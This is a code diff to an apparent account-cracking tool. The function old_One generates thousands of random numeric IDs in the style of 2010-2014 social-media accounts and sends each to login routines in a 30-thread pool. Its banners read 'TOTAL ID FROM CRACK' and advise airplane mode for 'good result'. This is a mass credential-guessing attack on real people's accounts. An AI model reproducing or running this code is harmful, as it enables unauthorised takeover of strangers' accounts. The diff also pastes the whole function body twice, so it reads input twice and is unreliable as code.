@@ -452,24 +452,79 @@ def old_clone():
     elif _input in ('4', '04'):
         old_Tree1()
     else:
-        print(f"\n[×]{rad}Choose Valid Option")
+        print(f"\n{rad}Choose Valid Option")
+        time.sleep(1)
         BNG_71_()
 
 
+# ===================== FIXED old_One =====================
 def old_One():
-    """
-    Cloning method for accounts from 2010-2014.
-    """
     user = []
     ____banner____()
-    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mOld Code {Y}:{G} 2010-2014 TYP-1");os.system('espeak -a 300 "type 1,"')
+    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mOld Code {Y}:{G} 2010-2014 TYP-1")
     ask = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mSELECT {Y}:{G} ")
     linex()
+    
     ____banner____()
-    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mEXAMPLE {Y}:{G} 20000 / 30000 / 99999");os.system('espeak -a 300 "enter,  limit, like, 50, thousand,"')
-    limit = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;46mSELECT {Y}:{G} ")
+    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    try:
+        limit = int(input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;46mSELECT {Y}:{G} "))
+    except:
+        limit = 5000
+    
     linex()
     star = '10000'
+    for _ in range(limit):
+        data = str(random.choice(range(1000000000, 4999999999)))
+        user.append(star + data)
+    
+    print('\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mMETHOD 1')
+    print('\x1b[38;5;196m[\x1b[1;37m2\x1b[38;5;196m]\x1b[38;5;218mMETHOD 2')
+    linex()
+    meth = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mCHOICE {W}(1/2): {Y}").strip().upper()
+    
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
+        print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mUSE AIRPLANE MODE FOR GOOD RESULT{G}")
+        linex()
+        for uid in user:
+            if meth == '1':
+                pool.submit(login_1, uid)
+            elif meth == '2':
+                pool.submit(login_2, uid)
+    user = []
+    ____banner____()
+    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mOld Code {Y}:{G} 2010-2014 TYP-1")
+    ask = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mSELECT {Y}:{G} ")
+    linex()
+    
+    ____banner____()
+    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;46mSELECT {Y}:{G} ")
+    linex()
+    
+    star = '10000'
+    for _ in range(int(limit)):
+        data = str(random.choice(range(1000000000, 4999999999)))
+        user.append(star + data)
+    
+    print('\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mMETHOD 1')
+    print('\x1b[38;5;196m[\x1b[1;37m2\x1b[38;5;196m]\x1b[38;5;218mMETHOD 2')
+    linex()
+    meth = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mCHOICE {W}(1/2): {Y}").strip()
+    
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
+        print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mUSE AIRPLANE MODE FOR GOOD RESULT{G}")
+        linex()
+        for mal in user:
+            uid = mal
+            if meth == '1':
+                pool.submit(login_1, uid)
+            elif meth == '2':
+                pool.submit(login_2, uid)
     for _ in range(int(limit)):
         data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
         user.append(data)
